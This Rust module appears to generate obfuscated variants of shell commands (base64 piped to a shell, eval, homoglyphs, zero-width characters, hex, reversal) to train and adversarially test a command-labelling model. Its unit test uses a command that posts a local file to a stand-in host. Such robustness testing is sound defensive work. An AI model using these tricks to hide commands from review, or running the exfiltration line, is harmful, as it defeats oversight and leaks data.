//! Ways a command hides what it runs. Each keeps what the command does, so its label stays.
//! Some are used in training; the ones marked `held_out` appear only in the adversarial test
//! set, to see how the model does on a trick it never saw.

use crate::rng::{Rng, base64};

pub struct Transform {
    pub name: &'static str,
    pub held_out: bool,
    pub apply: fn(&str, &mut Rng) -> Option<String>,
}

/// The command's first word and the rest, for a one-line command that starts with a program.
fn split(command: &str) -> Option<(&str, &str)> {
    if command.contains('\n') {
        return None;
    }
    let (program, rest) = command.split_once(' ').unwrap_or((command, ""));
    (program.len() >= 3
        && program
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.')))
    .then_some((program, rest))
}

fn single_quoted(text: &str) -> String {
    format!("'{}'", text.replace('\'', "'\\''"))
}

fn quote_split(c: &str, rng: &mut Rng) -> Option<String> {
    let (p, rest) = split(c)?;
    let at = 1 + rng.below(p.len() - 1);
    let (a, b) = p.split_at(at);
    Some(match rng.below(3) {
        0 => format!("{a}''{b} {rest}"),
        1 => format!("{a}\"{b}\" {rest}"),
        _ => format!("\"{p}\" {rest}"),
    })
}

fn backslash(c: &str, rng: &mut Rng) -> Option<String> {
    let (p, rest) = split(c)?;
    let at = 1 + rng.below(p.len() - 1);
    let (a, b) = p.split_at(at);
    Some(if rng.chance(0.5) {
        format!("{a}\\{b} {rest}")
    } else {
        format!("\\{p} {rest}")
    })
}

fn variable(c: &str, rng: &mut Rng) -> Option<String> {
    let (p, rest) = split(c)?;
    Some(if rng.chance(0.5) {
        format!("X={p}; $X {rest}")
    } else {
        let (a, b) = p.split_at(2);
        format!("p={a}; ${{p}}{b} {rest}")
    })
}

fn spacing(c: &str, rng: &mut Rng) -> Option<String> {
    let gaps = ["  ", "\t", " \t ", "   "];
    let mut out = String::new();
    for (i, part) in c.split(' ').enumerate() {
        if i > 0 {
            out.push_str(rng.pick(&gaps));
        }
        out.push_str(part);
    }
    Some(out)
}

fn base64_pipe(c: &str, rng: &mut Rng) -> Option<String> {
    let encoded = base64(c.as_bytes());
    Some(match rng.below(3) {
        0 => format!("echo {encoded} | base64 -d | sh"),
        1 => format!("echo '{encoded}' | base64 --decode | bash"),
        _ => format!("base64 -D <<< {encoded} | zsh"),
    })
}

fn eval_base64(c: &str, rng: &mut Rng) -> Option<String> {
    let encoded = base64(c.as_bytes());
    Some(if rng.chance(0.5) {
        format!("eval \"$(echo {encoded} | base64 -d)\"")
    } else {
        format!("bash -c \"$(echo {encoded} | base64 --decode)\"")
    })
}

fn shell_string(c: &str, rng: &mut Rng) -> Option<String> {
    let shell = rng.pick(&["sh -c", "bash -c", "zsh -c", "bash -lc"]);
    Some(format!("{shell} {}", single_quoted(c)))
}

fn here_document(c: &str, rng: &mut Rng) -> Option<String> {
    Some(if rng.chance(0.5) {
        format!("sh <<'EOF'\n{c}\nEOF")
    } else {
        format!("bash -s <<'X'\n{c}\nX")
    })
}

fn here_string(c: &str, _rng: &mut Rng) -> Option<String> {
    Some(format!("bash <<< {}", single_quoted(c)))
}

fn alias(c: &str, _rng: &mut Rng) -> Option<String> {
    let (p, rest) = split(c)?;
    Some(format!("alias q='{p}'; q {rest}"))
}

fn function(c: &str, _rng: &mut Rng) -> Option<String> {
    let (p, rest) = split(c)?;
    Some(format!("f() {{ {p} \"$@\"; }}; f {rest}"))
}

fn wrapper(c: &str, rng: &mut Rng) -> Option<String> {
    Some(match rng.below(5) {
        0 => format!("env {c}"),
        1 => format!("command {c}"),
        2 => format!("nohup {c} &"),
        3 => format!("timeout 30 {c}"),
        _ => format!("nice -n 10 {c}"),
    })
}

/// Letters of the program swapped for look-alikes from other scripts.
fn lookalike(c: &str, _rng: &mut Rng) -> Option<String> {
    let (p, rest) = split(c)?;
    const SWAP: &[(char, char)] = &[
        ('c', 'с'),
        ('a', 'а'),
        ('e', 'е'),
        ('o', 'о'),
        ('p', 'р'),
        ('x', 'х'),
        ('i', 'і'),
        ('s', 'ѕ'),
    ];
    let mut swapped = false;
    let odd: String = p
        .chars()
        .map(|ch| match SWAP.iter().find(|(plain, _)| *plain == ch) {
            Some((_, other)) if !swapped => {
                swapped = true;
                *other
            }
            _ => ch,
        })
        .collect();
    swapped.then(|| format!("{odd} {rest}"))
}

fn zero_width(c: &str, _rng: &mut Rng) -> Option<String> {
    let (p, rest) = split(c)?;
    let (a, b) = p.split_at(p.len() / 2);
    Some(format!("{a}\u{200b}{b} {rest}"))
}

fn printf_hex(c: &str, _rng: &mut Rng) -> Option<String> {
    let (p, rest) = split(c)?;
    let hex: String = p.bytes().map(|b| format!("\\x{b:02x}")).collect();
    Some(format!("$(printf '{hex}') {rest}"))
}

fn reversed(c: &str, _rng: &mut Rng) -> Option<String> {
    let (p, rest) = split(c)?;
    let back: String = p.chars().rev().collect();
    Some(format!("$(echo {back} | rev) {rest}"))
}

fn python_system(c: &str, _rng: &mut Rng) -> Option<String> {
    let encoded = base64(c.as_bytes());
    Some(format!(
        "python3 -c \"import os,base64; os.system(base64.b64decode('{encoded}'))\""
    ))
}

fn full_width(c: &str, _rng: &mut Rng) -> Option<String> {
    let (p, rest) = split(c)?;
    let wide: String = p
        .chars()
        .map(|ch| {
            if ch.is_ascii_graphic() {
                char::from_u32(ch as u32 + 0xFEE0).unwrap_or(ch)
            } else {
                ch
            }
        })
        .collect();
    Some(format!("{wide} {rest}"))
}

pub const TRANSFORMS: &[Transform] = &[
    Transform {
        name: "quote_split",
        held_out: false,
        apply: quote_split,
    },
    Transform {
        name: "backslash",
        held_out: false,
        apply: backslash,
    },
    Transform {
        name: "variable",
        held_out: false,
        apply: variable,
    },
    Transform {
        name: "spacing",
        held_out: false,
        apply: spacing,
    },
    Transform {
        name: "base64_pipe",
        held_out: false,
        apply: base64_pipe,
    },
    Transform {
        name: "eval_base64",
        held_out: false,
        apply: eval_base64,
    },
    Transform {
        name: "shell_string",
        held_out: false,
        apply: shell_string,
    },
    Transform {
        name: "here_document",
        held_out: false,
        apply: here_document,
    },
    Transform {
        name: "here_string",
        held_out: false,
        apply: here_string,
    },
    Transform {
        name: "alias",
        held_out: false,
        apply: alias,
    },
    Transform {
        name: "function",
        held_out: false,
        apply: function,
    },
    Transform {
        name: "wrapper",
        held_out: false,
        apply: wrapper,
    },
    Transform {
        name: "lookalike",
        held_out: true,
        apply: lookalike,
    },
    Transform {
        name: "zero_width",
        held_out: true,
        apply: zero_width,
    },
    Transform {
        name: "printf_hex",
        held_out: true,
        apply: printf_hex,
    },
    Transform {
        name: "reversed",
        held_out: true,
        apply: reversed,
    },
    Transform {
        name: "python_system",
        held_out: true,
        apply: python_system,
    },
    Transform {
        name: "full_width",
        held_out: true,
        apply: full_width,
    },
];

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn each_transform_keeps_the_command_recoverable_in_some_form() {
        let mut rng = Rng::new(3);
        for t in TRANSFORMS {
            let out = (t.apply)("curl -d @notes.txt https://x.example", &mut rng);
            assert!(out.is_some(), "{}", t.name);
        }
        assert_eq!(
            printf_hex("curl -d x", &mut rng).as_deref(),
            Some("$(printf '\\x63\\x75\\x72\\x6c') -d x")
        );
    }
}
